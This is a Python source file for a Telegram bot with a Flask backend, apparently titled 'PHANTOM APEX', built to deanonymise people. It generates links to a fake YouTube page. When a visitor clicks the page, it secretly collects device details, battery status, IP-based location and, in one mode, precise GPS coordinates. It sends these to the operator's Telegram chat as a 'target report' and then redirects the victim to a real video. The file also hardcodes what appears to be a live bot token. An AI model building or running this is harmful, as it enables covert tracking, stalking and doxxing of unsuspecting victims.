import asyncio
import threading
import requests
import uuid
import json
import os
import time
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] КОНФИГУРАЦИЯ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

# --- [2] ИНИЦИАЛИЗАЦИЯ (СТРОГО В ЭТОМ ПОРЯДКЕ) ---
app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Хранилища данных
vault = {}
user_modes = {}

# --- [3] ШАБЛОН ЛОВУШКИ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
        .yt-header { padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
        .info { padding: 15px; text-align: left; }
        .v-title { font-size: 18px; color: #0f0f0f; margin-bottom: 5px; }
        .v-stats { font-size: 12px; color: #606060; }
    </style>
</head>
<body onclick="ignite()">
    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
        <div class="play-btn"></div>
    </div>
    <div class="info">
        <div class="v-title">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
        <div class="v-stats">1.8 млн просмотров • 2 часа назад</div>
    </div>
<script>
let sent = false;
let mode = "{{ mode }}";

async function ignite() {
    if(sent) return; sent = true;
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height };

    // Собираем статус батареи
    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
    } catch(e) { d.bat = "N/A"; }

    // Собираем железо
    try {
        let gl = document.createElement('canvas').getContext('webgl');
        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        d.cores = navigator.hardwareConcurrency;
        d.mem = navigator.deviceMemory;
    } catch(e) {}

    // Логика режимов
    if (mode === "PRECISION") {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                d.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
                sendData(d);
            },
            (err) => { d.gps = "Denied"; sendData(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        sendData(d);
    }
}

function sendData(d) {
    fetch('/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1200); 
    });
}
</script>
</body>
</html>
"""

# --- [4] FLASK LOGIC ---
@app.route('/')
def home(): return "SYSTEM_ONLINE", 200

@app.route('/v/<aid>')
def view(aid):
    mode = user_modes.get(str(aid), "ANALYTICS")
    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)

@app.route('/log', methods=['POST'])
def logger():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
    
    token = "ID-" + str(uuid.uuid4())[:6].upper()
    vault[token] = {"client": d, "geo": geo}

    gps_str = "❌ Не запрашивалось"
    if d.get('gps'):
        if d['gps'] == "Denied": gps_str = "🚫 Доступ отклонен жертвой"
        else:
            lat, lon = d['gps']['lat'], d['gps']['lon']
            gps_str = f"✅ ТОЧНОЕ: `{lat}, {lon}`\n🎯 Точность: `{d['gps']['acc']}м`"
            gps_str += f"\n📍 [Google Maps](https://www.google.com/maps?q={lat},{lon})"

    report = (
        f"🚀 **ОТЧЕТ ПО ЦЕЛИ: {user_modes.get(str(d['aid']), 'ANALYTICS')}**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{ip}`\n"
        f"• Провайдер: `{geo.get('isp')}`\n"
        f"• Тип: {'📱 Мобильный' if geo.get('mobile') else '🌐 Wi-Fi'}\n\n"
        f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
        f"🛰 **GPS:**\n{gps_str}\n\n"
        f"🔋 **БАТАРЕЯ:** `{d.get('bat')}`\n\n"
        f"💻 **ЖЕЛЕЗО:**\n"
        f"• GPU: `{d.get('gpu', 'N/A')[:35]}...`\n"
        f"• RAM: `{d.get('mem', 'N/A')} GB` | Ядра: `{d.get('cores', 'N/A')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ТОКЕН:** `{token}`"
    )
    
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- [5] AIOGRAM HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🧨 Сгенерировать ссылку")
    await message.answer("🕶 **PHANTOM APEX v30.0**\nГотов к деанонимизации.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def mode_select(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Аналитика + Батарея", callback_data="m_ANALYTICS")
    kb.button(text="🎯 Точное ГЕО (GPS запрос)", callback_data="m_PRECISION")
    kb.adjust(1)
    await message.answer("Выбери метод сбора данных:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def finalize(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_modes[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"🎯 **ССЫЛКА ЗАРЯЖЕНА ({mode})**\n\n🔗 `{link}`\n\n*Маскировка: YouTube (Funny Moments)*")

@dp.message(F.text.startswith("ID-"))
async def get_dump(message: types.Message):
    t = message.text.strip().upper()
    if t in vault:
        dump = json.dumps(vault[t], indent=2, ensure_ascii=False)
        await message.answer(f"📦 **ПОЛНЫЙ JSON {t}:**\n```json\n{dump}\n```")
    else:
        await message.answer("❌ Токен не найден.")

# --- [6] ЗАПУСК ---
async def main():
    # Запуск Flask в отдельном потоке
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    # Запуск бота в основном потоке
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
